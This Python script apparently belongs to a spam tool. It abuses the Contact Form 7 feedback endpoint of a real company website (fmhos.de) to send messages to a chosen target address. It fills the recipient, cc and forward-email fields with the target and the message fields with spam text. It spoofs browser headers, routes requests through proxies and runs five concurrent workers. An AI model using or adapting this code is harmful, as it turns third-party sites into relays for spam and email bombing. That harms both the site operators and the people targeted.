from os.path import basename

import requests

import module.config
from module import Spam

cookies = {
    'wp-wpml_current_language': 'en',
    'borlabs-cookie': '%7B%22consents%22%3A%7B%22essential%22%3A%5B%22borlabs-cookie%22%5D%2C%22external-media%22%3A%5B%22facebook%22%2C%22googlemaps%22%2C%22instagram%22%2C%22openstreetmap%22%2C%22twitter%22%2C%22vimeo%22%2C%22youtube%22%5D%7D%2C%22domainPath%22%3A%22www.fmhos.de%2F%22%2C%22expires%22%3A%22Thu%2C%2031%20Aug%202023%2013%3A02%3A02%20GMT%22%2C%22uid%22%3A%220bqlc0f3-r40zzfl0-7hwky6gt-5fuymv7a%22%2C%22version%22%3A%221%22%7D',
}

headers = {
    'authority': 'www.fmhos.de',
    'accept': 'application/json, */*;q=0.1',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarysJqrH7Fru25hMqKB',
    # 'cookie': 'wp-wpml_current_language=en; borlabs-cookie=%7B%22consents%22%3A%7B%22essential%22%3A%5B%22borlabs-cookie%22%5D%2C%22external-media%22%3A%5B%22facebook%22%2C%22googlemaps%22%2C%22instagram%22%2C%22openstreetmap%22%2C%22twitter%22%2C%22vimeo%22%2C%22youtube%22%5D%7D%2C%22domainPath%22%3A%22www.fmhos.de%2F%22%2C%22expires%22%3A%22Thu%2C%2031%20Aug%202023%2013%3A02%3A02%20GMT%22%2C%22uid%22%3A%220bqlc0f3-r40zzfl0-7hwky6gt-5fuymv7a%22%2C%22version%22%3A%221%22%7D',
    'origin': 'https://www.fmhos.de',
    'pragma': 'no-cache',
    'referer': 'https://www.fmhos.de/en/contact/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n1346\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.7.3\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nen_US\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f1346-p1348-o1\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n1348\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="_wpcf7_posted_data_hash"\r\n\r\n\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="your-recipient"\r\n\r\nwezxasqw@gmail.com\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="your-name"\r\n\r\ntest\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="your-email"\r\n\r\nwezxasqw@gmail.com\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="your-tel"\r\n\r\ntest\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="telegram-time-start"\r\n\r\n1677230993\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="telegram-time-check"\r\n\r\n4\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="telegram"\r\n\r\n\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="your-subject"\r\n\r\ntest\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="your-message"\r\n\r\ntest\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="forward-email"\r\n\r\non\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="acceptance-586"\r\n\r\n1\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="re-email"\r\n\r\nwezxasqw@gmail.com\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB\r\nContent-Disposition: form-data; name="cc-email"\r\n\r\nwezxasqw@gmail.com\r\n' \
               '------WebKitFormBoundarysJqrH7Fru25hMqKB--\r\n'

        data = data.replace(module.config.TEST_TARGET, target).replace('test', self.get_text()).encode()

        response = requests.post(
            'https://www.fmhos.de/en/wp-json/contact-form-7/v1/contact-forms/1346/feedback',
            cookies=cookies,
            headers=headers,
            data=data, proxies=self.get_proxies()
        )

        return response


def main():
    s = 'mail_sent'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(5)


if __name__ == '__main__':
    main()
